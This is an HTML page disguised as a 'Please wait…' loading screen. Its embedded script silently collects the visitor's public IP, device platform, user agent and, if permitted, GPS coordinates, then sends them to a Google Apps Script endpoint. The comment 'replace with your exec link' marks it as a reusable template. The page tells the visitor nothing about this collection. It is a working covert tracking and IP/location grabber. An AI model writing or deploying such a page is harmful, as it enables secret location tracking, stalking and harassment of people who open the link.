<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body>
  <h2>Please waitâ€¦</h2>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycby0RafrsPwH0k6wQjpHKP99p3kOy-b3ouYaod6v1mokXfbzQ4gdMytWxGOU53OCtw8q/exec"; // replace with your exec link

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        const ip = ipData.ip || "";
        const device = navigator.platform || "";
        const ua = navigator.userAgent || "";

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            const lat = pos.coords.latitude || "";
            const lng = pos.coords.longitude || "";

            fetch(`${scriptURL}?lat=${lat}&lng=${lng}&ip=${ip}&device=${device}&ua=${encodeURIComponent(ua)}`);
          }, () => {
            // If location denied
            fetch(`${scriptURL}?ip=${ip}&device=${device}&ua=${encodeURIComponent(ua)}`);
          });
        } else {
          // If no geolocation
          fetch(`${scriptURL}?ip=${ip}&device=${device}&ua=${encodeURIComponent(ua)}`);
        }
      });
  </script>
</body>
</html>

